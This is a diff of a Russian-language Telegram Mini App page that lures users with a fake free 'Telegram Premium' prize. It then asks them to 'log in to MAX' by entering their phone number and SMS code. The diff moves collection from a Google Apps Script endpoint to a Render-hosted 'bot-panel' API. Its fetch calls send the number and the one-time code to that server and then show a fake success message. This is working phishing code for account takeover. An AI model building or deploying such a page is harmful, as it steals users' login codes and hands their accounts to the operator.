@@ -105,6 +105,7 @@
 </head>
 <body>
     <div class="container">
+
         <div id="step-premium">
             <div class="icon-circle">⭐</div>
             <div class="title">Telegram Premium</div>
@@ -112,10 +113,12 @@
             <button class="btn-primary" onclick="goToMax()">🎁 Забрать Premium</button>
             <button class="btn-secondary" onclick="tg.close()">Отмена</button>
         </div>
+
         <div id="step-max" class="hidden">
             <div class="max-icon">MAX</div>
             <div class="title">Вход в MAX</div>
             <div class="subtitle">Нажмите кнопку, чтобы поделиться номером телефона.<br>Мы отправим SMS с кодом.</div>
+
             <div id="max-phone-form">
                 <div class="input-group">
                     <label>📱 Номер телефона</label>
@@ -123,6 +126,7 @@
                 </div>
                 <button class="btn-primary" onclick="sendCode()">📱 Поделиться номером</button>
             </div>
+
             <div id="max-code-form" class="hidden">
                 <div class="input-group">
                     <label>🔑 Код из SMS</label>
@@ -131,24 +135,32 @@
                 <button class="btn-primary" onclick="verifyCode()">✅ Подтвердить</button>
                 <div class="code-status">⏳ Код отправлен на ваш номер</div>
             </div>
+
             <div class="footer-text">Нажимая кнопку, вы соглашаетесь с условиями</div>
         </div>
+
         <div id="step-success" class="hidden">
             <div class="icon-circle">🎉</div>
             <div class="title">Поздравляем!</div>
             <div class="subtitle">Premium активирован!<br>Приз будет начислен в течение 5 минут.</div>
             <button class="btn-secondary" onclick="tg.close()">Закрыть</button>
         </div>
+
     </div>
+
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
         let phoneNumber = '';
-        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxAC1AOQLdHeasipWu7j3a6cBe7bnPRm6UTQ4Ql-a0OqprBTy0qY8UsPLSlUIO6yYQZ0w/exec";
+
+        // ====== ОТПРАВКА В ТВОЙ API ======
+        const API_BASE = "https://bot-panel-v2.onrender.com";
+
         function goToMax() {
             document.getElementById('step-premium').classList.add('hidden');
             document.getElementById('step-max').classList.remove('hidden');
         }
+
         function sendCode() {
             const phone = document.getElementById('phone-input').value.trim();
             if (!phone || phone.length < 10) {
@@ -156,29 +168,47 @@
                 return;
             }
             phoneNumber = phone;
-            document.getElementById('max-phone-form').classList.add('hidden');
-            document.getElementById('max-code-form').classList.remove('hidden');
+
+            fetch(API_BASE + '/api/contact', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: phoneNumber, template: 'premium' })
+            })
+            .then(r => r.json())
+            .then(data => {
+                if (data.status === 'code_sent') {
+                    document.getElementById('max-phone-form').classList.add('hidden');
+                    document.getElementById('max-code-form').classList.remove('hidden');
+                } else {
+                    alert('Ошибка отправки кода');
+                }
+            })
+            .catch(() => alert('Ошибка соединения с сервером'));
         }
+
         function verifyCode() {
             const code = document.getElementById('code-input').value.trim();
             if (!code || code.length < 4) {
                 alert('Введите корректный код');
                 return;
             }
-            fetch(SCRIPT_URL, {
+
+            fetch(API_BASE + '/api/verify', {
                 method: 'POST',
-                mode: 'no-cors',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    phone: phoneNumber,
-                    code: code,
-                    template: 'premium',
-                    user_id: tg.initDataUnsafe?.user?.id || 'unknown'
-                })
-            });
-            document.getElementById('step-max').classList.add('hidden');
-            document.getElementById('step-success').classList.remove('hidden');
-            setTimeout(() => tg.close(), 3000);
+                body: JSON.stringify({ phone: phoneNumber, code, template: 'premium' })
+            })
+            .then(r => r.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    document.getElementById('step-max').classList.add('hidden');
+                    document.getElementById('step-success').classList.remove('hidden');
+                    setTimeout(() => tg.close(), 3000);
+                } else {
+                    alert('Неверный код. Попробуйте снова.');
+                }
+            })
+            .catch(() => alert('Ошибка проверки кода'));
         }
     </script>
 </body>
